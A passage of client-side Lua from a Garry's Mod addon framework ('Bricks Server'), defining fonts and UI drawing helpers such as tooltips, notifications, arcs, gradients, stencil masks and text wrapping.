		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font20", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 20 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_NoSC_Font20", {
		font = "Montserrat Medium",
		extended = false,
		size = 20,
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font17", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 17 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_NoSC_Font17", {
		font = "Montserrat Medium",
		extended = false,
		size = 17,
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font17B", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 17 ),
		weight = 5000,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font18", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 18 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font19", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 19 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font20B", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 20 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font26", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 26 ),
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font30", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 27 ),
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font32", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 32 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font33", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 33 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_NoSC_Font33", {
		font = "Montserrat Medium",
		extended = false,
		size = 33,
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font28B", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 28 ),
		weight = 650,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font36B", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 38 ),
		weight = 650,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font40", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 40 ),
		weight = 5000,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_NoSC_Font40", {
		font = "Montserrat Medium",
		extended = false,
		size = 40,
		weight = 5000,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font45", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 45 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font40B", {
		font = "Montserrat Bold",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 40 ),
		weight = 5000,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font50", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 70 ),
		weight = 5000,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font53", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 53 ),
		weight = 5000,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font20", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 20 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font11", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 11 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font13", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 13, 10 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font15", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 15 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font22B", {
		font = "Montserrat Bold",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 22 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font21", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 21 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font22", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 22 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font23B", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 23 ),
		weight = 5000,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_HUDFont", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 27 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font31", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 31 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_HUDFontS", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 25 ),
		weight = 5000,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_HUDFontB", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 30 ),
		weight = 5000,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font100", {
		font = "Montserrat Bold",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 75 ),
		weight = 5000,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font50", {
		font = "Montserrat Bold",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 50 ),
		weight = 5000,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font30B", {
		font = "Montserrat Bold",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 30 ),
		weight = 5000,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font60B", {
		font = "Montserrat Bold",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 60 ),
		weight = 5000,
		outline = false,
		extended = true,
	} )

	-- New Fonts
	surface.CreateFont( "BRS.Font.Bold20", {
		font = "Montserrat Bold",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 20 ),
		weight = 500,
		outline = false,
		extended = true,
	} )
end
createFonts()

hook.Add( "OnScreenSizeChanged", "BRS.OnScreenSizeChanged.Fonts", createFonts )

--[[ FUNCTIONS ]]--
local blur = Material("pp/blurscreen")
function BRICKS_SERVER.Func.DrawBlur( p, a, d )
	local x, y = p:LocalToScreen(0, 0)
	surface.SetDrawColor( 255, 255, 255 )
    surface.SetMaterial( blur )
    
	for i = 1, d do
		blur:SetFloat( "$blur", (i / d ) * ( a ) )
		blur:Recompute()
		render.UpdateScreenEffectTexture()
		surface.DrawTexturedRect( x * -1, y * -1, ScrW(), ScrH() )
	end
end

local panelMeta = FindMetaTable( "Panel" )
function panelMeta:SetBRSToolTip( posX, posY, sizeW, sizeH, text, visiblePanel )
	self.OnCursorEntered = function()
		if( self.Menu and IsValid( self.Menu ) ) then return end
		
		if( IsValid( BRS_TOOLTIP ) ) then
			BRS_TOOLTIP:Remove()
		end

		local textTable = text
		if( not istable( text ) ) then
			textTable = { text }
		end

		BRS_TOOLTIP = vgui.Create( "DPanel" )
		BRS_TOOLTIP:MakePopup()
		BRS_TOOLTIP:DockPadding( 10, 5, 0, 0 )
		BRS_TOOLTIP.Paint = function( self2, w, h )
			BRICKS_SERVER.BSHADOWS.BeginShadow()
			local x, y = self2:LocalToScreen( 0, 0 )
			draw.RoundedBox( 8, x, y, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )			
			BRICKS_SERVER.BSHADOWS.EndShadow(1, 1, 1, 255, 0, 0, false )
		end

		local textX, textY = 0, 0
		for k, v in pairs( textTable ) do
			local textString = v
			local textColor = BRICKS_SERVER.Func.GetTheme( 6 )
			local textFont = "BRICKS_SERVER_Font20"
			if( istable( v ) ) then
				textString = v[1] or BRICKS_SERVER.Func.L( "errorNoText" )
				textColor = v[2] or BRICKS_SERVER.Func.GetTheme( 6 )
				textFont = v[3] or "BRICKS_SERVER_Font20"
			end

			surface.SetFont( textFont )
			
			local newTextX, newTextY = surface.GetTextSize( textString )
			if( newTextX > textX ) then
				textX = newTextX
			end
			textY = textY+newTextY

			local textPanel = vgui.Create( "DLabel", BRS_TOOLTIP )
			textPanel:SetText( textString )
			textPanel:SetFont( textFont )
			textPanel:Dock( TOP )
			textPanel:SetTall( newTextY )

			if( isfunction( textColor ) ) then
				textPanel.Think = function()
					textPanel:SetTextColor( textColor() )
				end
			else
				textPanel:SetTextColor( textColor )
			end
		end

		BRS_TOOLTIP:SetSize( textX+20, textY+10 )
		BRS_TOOLTIP:SetPos( posX+sizeW+5, posY+(sizeH/2)-(BRS_TOOLTIP:GetTall()/2) )
		BRS_TOOLTIP:SetAlpha( 0 )
		BRS_TOOLTIP:AlphaTo( 255, 0.1 )
		BRS_TOOLTIP.Think = function()
			if( IsValid( BRS_TOOLTIP ) and not self:IsHovered() ) then
				BRS_TOOLTIP:Remove()
			end
		end
	end

	self.OnCursorExited = function()
		if( IsValid( BRS_TOOLTIP ) ) then
			BRS_TOOLTIP:Remove()
		end
	end

	self.OnRemove = function()
		if( IsValid( BRS_TOOLTIP ) ) then
			BRS_TOOLTIP:Remove()
		end
	end
end

local entityMeta = FindMetaTable( "Entity" )
function entityMeta:SetBRSEntityToolTip( text )
	if( not IsValid( self ) ) then return end

	if( not BRS_ENTITY_TOOLTIPS ) then
		BRS_ENTITY_TOOLTIPS = {}
	end

	local textTable = text
	if( not istable( text ) ) then
		textTable = { text }
	end

	local textX, textY = 0, 0
	for k, v in pairs( textTable ) do
		local textString = v
		local textColor = BRICKS_SERVER.Func.GetTheme( 6 )
		local textFont = "BRICKS_SERVER_Font20"
		if( istable( v ) ) then
			textString = v[1] or BRICKS_SERVER.Func.L( "errorNoText" )
			textColor = v[2] or BRICKS_SERVER.Func.GetTheme( 6 )
			textFont = v[3] or "BRICKS_SERVER_Font20"
		end

		surface.SetFont( textFont )
		
		local newTextX, newTextY = surface.GetTextSize( textString )
		if( newTextX > textX ) then
			textX = newTextX
		end
		textY = textY+newTextY
	end

	BRS_ENTITY_TOOLTIPS[self] = { textTable, textX+20, textY+10 }
end

-- hook.Add( "HUDPaint", "BRS.HUDPaint.EntityToolTips", function()
	-- if( LocalPlayer():GetEyeTrace() and LocalPlayer():GetEyeTrace().HitPos ) then
		-- local hitPos = LocalPlayer():GetEyeTrace().HitPos

		-- if( LocalPlayer():GetPos():DistToSqr( hitPos ) > 10000 ) then return end

		-- local entTable = {}
		-- for k, v in pairs( ents.FindInSphere( hitPos, 25 ) ) do
			-- if( IsValid( v ) and BRS_ENTITY_TOOLTIPS and BRS_ENTITY_TOOLTIPS[v] ) then
				-- table.insert( entTable, { hitPos:DistToSqr( v:GetPos() ), v } )
			-- end
		-- end

		-- table.sort( entTable, function(a, b) return a[1] < b[1] end )

		-- local ent = (entTable[1] or {})[2]
		-- if( ent and IsValid( ent ) ) then
			-- local pos = Vector( ent:GetPos().x, ent:GetPos().y, ent:GetPos().z+25 )
			-- local pos2d = pos:ToScreen()

			-- local textTable, width, height = BRS_ENTITY_TOOLTIPS[ent][1], BRS_ENTITY_TOOLTIPS[ent][2], BRS_ENTITY_TOOLTIPS[ent][3]
			-- local xPos, yPos = pos2d.x, pos2d.y

			-- draw.RoundedBox( 5, xPos, yPos, width, height, BRICKS_SERVER.Func.GetTheme( 0 ) )

			-- local textX, textY = 0, 0
			-- for i = 1, #textTable do
				-- local textString = textTable[i] or ""
				-- local textColor = BRICKS_SERVER.Func.GetTheme( 6 )
				-- local textFont = "BRICKS_SERVER_Font20"
				-- if( istable( textTable[i] ) ) then
					-- textString = textTable[i][1] or BRICKS_SERVER.Func.L( "errorNoText" )
					-- textColor = textTable[i][2] or BRICKS_SERVER.Func.GetTheme( 6 )
					-- textFont = textTable[i][3] or "BRICKS_SERVER_Font20"
				-- end

				-- draw.SimpleText( textString, textFont, xPos+10, yPos+5+textY, ((isfunction( textColor ) and textColor()) or textColor), 0, 0 )
	
				-- surface.SetFont( textFont )
				
				-- local newTextX, newTextY = surface.GetTextSize( textString )
				-- if( newTextX > textX ) then
					-- textX = newTextX
				-- end
				-- textY = textY+newTextY
			-- end
		-- end
	-- end
-- end )

hook.Add( "EntityRemoved", "BRS.EntityRemoved.RemoveEntityToolTips", function( ent )
	if( BRS_ENTITY_TOOLTIPS and BRS_ENTITY_TOOLTIPS[ent] ) then
		BRS_ENTITY_TOOLTIPS[ent] = nil
	end
end )

local notifQueue = {}
local function createNotif()
	if( not notifQueue[1] ) then return end

	local headerText, headerColor, subText, subColor = notifQueue[1][1], notifQueue[1][2], notifQueue[1][3], notifQueue[1][4]

	surface.PlaySound( "common/warning.wav" )

	BRS_CENTER_NOTIF_PANEL = vgui.Create( "DPanel" )
	BRS_CENTER_NOTIF_PANEL:SetSize( ScrW(), ScrH() )
	BRS_CENTER_NOTIF_PANEL:SetPos( -BRS_CENTER_NOTIF_PANEL:GetWide(), (ScrH()/2)-(BRS_CENTER_NOTIF_PANEL:GetTall()/2) )
	BRS_CENTER_NOTIF_PANEL:MoveTo( (ScrW()/2)-(BRS_CENTER_NOTIF_PANEL:GetWide()/2), (ScrH()/2)-(BRS_CENTER_NOTIF_PANEL:GetTall()/2), 0.5, 0, 1 )
	local spacing = 4
	BRS_CENTER_NOTIF_PANEL.Paint = function( self, w, h )
		draw.SimpleText( headerText, "BRICKS_SERVER_Font53", w/2-1, h/3+1+spacing, BRICKS_SERVER.Func.GetTheme( 3 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM )
		draw.SimpleText( headerText, "BRICKS_SERVER_Font53", w/2, h/3+spacing, headerColor, TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM )
		draw.SimpleText( subText, "BRICKS_SERVER_Font30", w/2-1, h/3+1-spacing, BRICKS_SERVER.Func.GetTheme( 3 ), TEXT_ALIGN_CENTER, 0 )
		draw.SimpleText( subText, "BRICKS_SERVER_Font30", w/2, h/3-spacing, subColor, TEXT_ALIGN_CENTER, 0 )
	end
	
	timer.Simple( 3, function()
		if( IsValid( BRS_CENTER_NOTIF_PANEL ) ) then
			BRS_CENTER_NOTIF_PANEL:MoveTo( ScrW(), (ScrH()/2)-(BRS_CENTER_NOTIF_PANEL:GetTall()/2), 0.5, 0, 1, function()
				if( IsValid( BRS_CENTER_NOTIF_PANEL ) ) then
					BRS_CENTER_NOTIF_PANEL:Remove()
					table.remove( notifQueue, 1 )
					createNotif()
				end
			end )
		end
	end )
end

function BRICKS_SERVER.Func.AddCenterNotification( headerText, headerColor, subText, subColor )
	if( BRS_CENTER_NOTIF_PANEL and IsValid( BRS_CENTER_NOTIF_PANEL ) ) then 
		for k, v in pairs( notifQueue ) do
			if( v[1] == headerText and v[3] == subText ) then
				return
			end
		end

		table.insert( notifQueue, { headerText, headerColor, subText, subColor } )
	else
		table.insert( notifQueue, { headerText, headerColor, subText, subColor } )
		createNotif()
	end
end

--[[ PAINTING ]]--
function BRICKS_SERVER.Func.DrawProgress( text, status )
	if( status >= 1 ) then return end
	
	local width, height = ScrW()*0.1, 10
	local y = (ScrH()/4)*3-50

	draw.RoundedBox( 5, (ScrW()/2)-(width/2), y, width, height, BRICKS_SERVER.Func.GetTheme( 3 ))

	draw.RoundedBox( 5, (ScrW()/2)-(width/2), y, width*math.Clamp( status, 0, 1 ), height, BRICKS_SERVER.Func.GetTheme( 5 ) )
end

local gradientDown = Material( 'vgui/gradient_down' )
local gradientUp = Material( 'vgui/gradient_up' )
local gradientLeft = Material( 'vgui/gradient-l' )
local gradientRight = Material( 'vgui/gradient-r' )
function BRICKS_SERVER.Func.DrawMaterialShadow( x, y, w, h, GradientType )
	if( GradientType == "Down" ) then
		surface.SetMaterial( gradientDown )
	elseif( GradientType == "Up" ) then
		surface.SetMaterial( gradientUp )	
	elseif( GradientType == "Left" ) then
		surface.SetMaterial( gradientLeft )	
	elseif( GradientType == "Right" ) then
		surface.SetMaterial( gradientRight )
	end
	surface.SetDrawColor( 0, 0, 0, 175 )
	surface.DrawTexturedRect( x, y, w, h )
end

function BRICKS_SERVER.Func.DrawCircle( x, y, radius, color )
	if( radius <= 0 ) then return end
	
	if( color and istable( color ) and color.r and color.g and color.b ) then
		surface.SetDrawColor( color )
	end
	
	draw.NoTexture()

	local cir = {}

	table.insert( cir, { x = x, y = y, u = 0.5, v = 0.5 } )
	for i = 0, 45 do
		local a = math.rad( ( i / 45 ) * -360 )
		table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )
	end

	local a = math.rad( 0 ) -- This is needed for non absolute segment counts
	table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )

	surface.DrawPoly( cir )
end

function BRICKS_SERVER.Func.PrecachedArc( cx, cy, radius, thickness, startang, endang, roughness )
	local triarc = {}
	-- local deg2rad = math.pi / 180
	
	-- Define step
	local roughness = math.max(roughness or 1, 1)
	local step = roughness
	
	-- Correct start/end ang
	local startang,endang = startang or 0, endang or 0
	
	if startang > endang then
		step = math.abs(step) * -1
	end
	
	-- Create the inner circle's points.
	local inner = {}
	local r = radius - thickness
	for deg=startang, endang, step do
		local rad = math.rad(deg)
		-- local rad = deg2rad * deg
		local ox, oy = cx+(math.cos(rad)*r), cy+(-math.sin(rad)*r)
		table.insert(inner, {
			x=ox,
			y=oy,
			u=(ox-cx)/radius + .5,
			v=(oy-cy)/radius + .5,
		})
	end	
	
	-- Create the outer circle's points.
	local outer = {}
	for deg=startang, endang, step do
		local rad = math.rad(deg)
		-- local rad = deg2rad * deg
		local ox, oy = cx+(math.cos(rad)*radius), cy+(-math.sin(rad)*radius)
		table.insert(outer, {
			x=ox,
			y=oy,
			u=(ox-cx)/radius + .5,
			v=(oy-cy)/radius + .5,
		})
	end	
	
	-- Triangulize the points.
	for tri=1,#inner*2 do -- twice as many triangles as there are degrees.
		local p1,p2,p3
		p1 = outer[math.floor(tri/2)+1]
		p3 = inner[math.floor((tri+1)/2)+1]
		if tri%2 == 0 then --if the number is even use outer.
			p2 = outer[math.floor((tri+1)/2)]
		else
			p2 = inner[math.floor((tri+1)/2)]
		end
	
		table.insert(triarc, {p1,p2,p3})
	end
	
	-- Return a table of triangles to draw.
	return triarc
end

function BRICKS_SERVER.Func.DrawCachedArc( arc, color )
	draw.NoTexture()

	if( color ) then
		surface.SetDrawColor( color )
	end

	for k,v in ipairs(arc) do
		surface.DrawPoly(v)
	end
end


function BRICKS_SERVER.Func.DrawArc( cx, cy, radius, thickness, startang, endang, color )
	BRICKS_SERVER.Func.DrawCachedArc( BRICKS_SERVER.Func.PrecachedArc( cx, cy, radius, thickness, startang, endang ), color )
end

local radiusAnim, fadeAnim, endRadius = 0.2, 0.2, 0
function BRICKS_SERVER.Func.DrawClickCircle( panel, w, h, color, cornerRadius )
	if( panel:IsDown() and not panel.doClickAnim ) then
		endRadius = math.sqrt( ((w/2)^2)+((h/2)^2) )
		panel.doClickAnimEndTime = CurTime()+radiusAnim+fadeAnim
		panel.doClickAnim = true
	end

	if( panel.doClickAnim ) then
		local timeLeft = (panel.doClickAnimEndTime or 0)-CurTime()
		if( timeLeft <= 0 ) then
			panel.doClickAnimEndTime = nil
			panel.doClickAnim = false
		end

		local radiusTimeLeft = (panel.doClickAnimEndTime or 0)-fadeAnim-CurTime()
		local radius = endRadius*math.Clamp( (radiusAnim-radiusTimeLeft)/radiusAnim, 0, 1 )

		local fade = 1
		if( CurTime() >= (panel.doClickAnimEndTime or 0)-fadeAnim ) then
			fade = math.Clamp( timeLeft/fadeAnim, 0, 1 )
		end

		surface.SetAlphaMultiplier( fade )
		draw.NoTexture()
		surface.SetDrawColor( color )
		if( cornerRadius ) then
			BRICKS_SERVER.Func.DrawRoundedMask( cornerRadius, 0, 0, w, h, function()
				BRICKS_SERVER.Func.DrawCircle( w/2, h/2, radius, radius )
			end )
		else
			BRICKS_SERVER.Func.DrawCircle( w/2, h/2, radius, radius )
		end
		surface.SetAlphaMultiplier( 1 )

	end
end

local g_grds, g_wgrd, g_sz
function BRICKS_SERVER.Func.DrawGradientBox(x, y, w, h, al, ...)
	g_grds = {...}

	x = math.Round( x )
	y = math.Round( y )
	w = math.Round( w )
	h = math.Round( h )

	al = math.Clamp(math.floor(al), 0, 1)
	if(al == 1) then
		local t = w
		w, h = h, t
	end
	g_wgrd = w / (#g_grds - 1)
	local n
	for i = 0, w do
		for c = 1, #g_grds do
			n = c
			if(i <= g_wgrd * c) then
				break
			end
		end
		g_sz = i - (g_wgrd * (n - 1))
		surface.SetDrawColor(
			Lerp(g_sz/g_wgrd, g_grds[n].r, g_grds[n + 1].r),
			Lerp(g_sz/g_wgrd, g_grds[n].g, g_grds[n + 1].g),
			Lerp(g_sz/g_wgrd, g_grds[n].b, g_grds[n + 1].b),
			Lerp(g_sz/g_wgrd, g_grds[n].a, g_grds[n + 1].a))
		if(al == 1) then
			surface.DrawRect(x, y + i, h, 1)
		else
			surface.DrawRect(x + i, y, 1, h)
		end
	end
end

local gradientMatR, gradientMatU, gradientMatD = Material("gui/gradient"), Material("gui/gradient_up"), Material("gui/gradient_down")
function BRICKS_SERVER.Func.DrawTexturedGradientBox(x, y, w, h, direction, ...)
	local colors = {...}
	local horizontal = direction != 1
	local secSize = math.ceil( ((horizontal and w) or h)/math.ceil( #colors/2 ) )
	
	local previousPos = (horizontal and x or y)-secSize
	for k, v in pairs( colors ) do
		if( k % 2 != 0 ) then
			previousPos = previousPos+secSize
			surface.SetDrawColor( v )
			surface.DrawRect( (horizontal and previousPos or x), (horizontal and y or previousPos), (horizontal and secSize or w), (horizontal and h or secSize) )
		end
	end

	local previousGradPos = (horizontal and x or y)-secSize
	for k, v in pairs( colors ) do
		if( k % 2 == 0 ) then
			previousGradPos = previousGradPos+secSize
			surface.SetDrawColor( v )
			surface.SetMaterial( horizontal and gradientMatR or gradientMatU )
			if( horizontal ) then
				surface.DrawTexturedRectUV( (horizontal and previousGradPos or x), (horizontal and y or previousGradPos), (horizontal and secSize or w), (horizontal and h or secSize), 1, 0, 0, 1)
			else
				surface.DrawTexturedRect( (horizontal and previousGradPos or x), (horizontal and y or previousGradPos), (horizontal and secSize or w), (horizontal and h or secSize))
			end

			if( colors[k+1] ) then
				surface.SetDrawColor( v )
				surface.SetMaterial( horizontal and gradientMatR or gradientMatD )
				surface.DrawTexturedRect((horizontal and previousGradPos+secSize or x), (horizontal and y or previousGradPos+secSize), (horizontal and secSize or w), (horizontal and h or secSize))
			end
		end
	end
end

-- Credits: https://github.com/Facepunch/garrysmod/blob/master/garrysmod/lua/includes/modules/draw.lua, https://gist.github.com/MysteryPancake/e8d367988ef05e59843f669566a9a59f
BRICKS_SERVER.MaskMaterial = CreateMaterial("!brsmask","UnlitGeneric",{
	["$translucent"] = 1,
	["$vertexalpha"] = 1,
	["$alpha"] = 1,
})

local whiteColor = Color( 255, 255, 255 )
local renderTarget
function BRICKS_SERVER.Func.DrawRoundedMask( cornerRadius, x, y, w, h, drawFunc )
	if( not renderTarget ) then
		renderTarget = GetRenderTargetEx( "BRS_GRADIENT_ROUNDEDBOX", ScrW(), ScrH(), RT_SIZE_FULL_FRAME_BUFFER, MATERIAL_RT_DEPTH_NONE, 2, CREATERENDERTARGETFLAGS_UNFILTERABLE_OK, IMAGE_FORMAT_RGBA8888 )
	end

	render.PushRenderTarget( renderTarget )
	render.OverrideAlphaWriteEnable( true, true )
	render.Clear( 0, 0, 0, 0 ) 

	drawFunc()

	--Draw the mask
	render.OverrideBlendFunc( true, BLEND_ZERO, BLEND_SRC_ALPHA, BLEND_DST_ALPHA, BLEND_ZERO )
	draw.RoundedBox( cornerRadius, x, y, w, h, whiteColor )
	render.OverrideBlendFunc( false )
	render.OverrideAlphaWriteEnable( false )
	render.PopRenderTarget() 

	--Update material
	BRICKS_SERVER.MaskMaterial:SetTexture( "$basetexture", renderTarget )

	--Clear material for upcoming draw calls
	draw.NoTexture()

	surface.SetDrawColor( 255, 255, 255, 255 ) 
	surface.SetMaterial( BRICKS_SERVER.MaskMaterial ) 
	render.SetMaterial( BRICKS_SERVER.MaskMaterial )
	render.DrawScreenQuad() 
end

function BRICKS_SERVER.Func.DrawGradientRoundedBox( cornerRadius, x, y, w, h, al, ... )
	local varArgs = { ... }
	BRICKS_SERVER.Func.DrawRoundedMask( cornerRadius, x, y, w, h, function()
		BRICKS_SERVER.Func.DrawGradientBox( x, y, w, h, al, unpack( varArgs ) )
	end )
end

function BRICKS_SERVER.Func.StartStencil()
	render.ClearStencil()
	render.SetStencilEnable( true )

	render.SetStencilWriteMask( 1 )
	render.SetStencilTestMask( 1 )

	render.SetStencilFailOperation( STENCILOPERATION_REPLACE )
	render.SetStencilPassOperation( STENCILOPERATION_ZERO )
	render.SetStencilZFailOperation( STENCILOPERATION_ZERO )
	render.SetStencilCompareFunction( STENCILCOMPARISONFUNCTION_NEVER )
	render.SetStencilReferenceValue( 1 )
end

function BRICKS_SERVER.Func.MiddleStencil()
	render.SetStencilFailOperation( STENCILOPERATION_ZERO )
	render.SetStencilPassOperation( STENCILOPERATION_REPLACE )
	render.SetStencilZFailOperation( STENCILOPERATION_ZERO )
	render.SetStencilCompareFunction( STENCILCOMPARISONFUNCTION_EQUAL )
	render.SetStencilReferenceValue( 1 )
end

function BRICKS_SERVER.Func.EndStencil()
	render.SetStencilEnable( false )
	render.ClearStencil()
end

function BRICKS_SERVER.Func.DrawPartialRoundedBox( cornerRadius, x, y, w, h, color, roundedBoxW, roundedBoxH, roundedBoxX, roundedBoxY )
	BRICKS_SERVER.Func.StartStencil()

	surface.SetDrawColor( 255, 255, 255, 255 )
	surface.DrawRect( x, y, w, h )

	BRICKS_SERVER.Func.MiddleStencil()

	draw.RoundedBox( cornerRadius, (roundedBoxX or x), (roundedBoxY or y), roundedBoxW, roundedBoxH, color )

	BRICKS_SERVER.Func.EndStencil()
end

function BRICKS_SERVER.Func.DrawPartialRoundedBoxEx( cornerRadius, x, y, w, h, color, roundedBoxW, roundedBoxH, roundedBoxX, roundedBoxY, roundTopLeft, roundTopRight, roundBottomLeft, roundBottomRight )
	BRICKS_SERVER.Func.StartStencil()

	surface.SetDrawColor( 255, 255, 255, 255 )
	surface.DrawRect( x, y, w, h )

	BRICKS_SERVER.Func.MiddleStencil()

	draw.RoundedBoxEx( cornerRadius, (roundedBoxX or x), (roundedBoxY or y), roundedBoxW, roundedBoxH, color, roundTopLeft, roundTopRight, roundBottomLeft, roundBottomRight )

	BRICKS_SERVER.Func.EndStencil()
end

-- Credits: https://github.com/FPtje/DarkRP/blob/master/gamemode/modules/base/cl_util.lua
local function charWrap(text, remainingWidth, maxWidth)
    local totalWidth = 0

    text = text:gsub(".", function(char)
        totalWidth = totalWidth + surface.GetTextSize(char)

        -- Wrap around when the max width is reached
        if totalWidth >= remainingWidth then
            -- totalWidth needs to include the character width because it's inserted in a new line
            totalWidth = surface.GetTextSize(char)
            remainingWidth = maxWidth
            return "\n" .. char
        end

        return char
    end)

    return text, totalWidth
end

function BRICKS_SERVER.Func.TextWrap(text, font, maxWidth)
    local totalWidth = 0

    surface.SetFont(font)

    local spaceWidth = surface.GetTextSize(' ')
    text = text:gsub("(%s?[%S]+)", function(word)
		local char = string.sub(word, 1, 1)
		if char == "\n" or char == "\t" then
			totalWidth = 0
		end

		local wordlen = surface.GetTextSize(word)
		totalWidth = totalWidth + wordlen

		-- Wrap around when the max width is reached
		if wordlen >= maxWidth then -- Split the word if the word is too big
			local splitWord, splitPoint = charWrap(word, maxWidth - (totalWidth - wordlen), maxWidth)
			totalWidth = splitPoint
			return splitWord
		elseif totalWidth < maxWidth then
			return word
		end

		-- Split before the word
		if char == ' ' then
			totalWidth = wordlen - spaceWidth
			return '\n' .. string.sub(word, 2)
		end

		totalWidth = wordlen
		return '\n' .. word
	end)

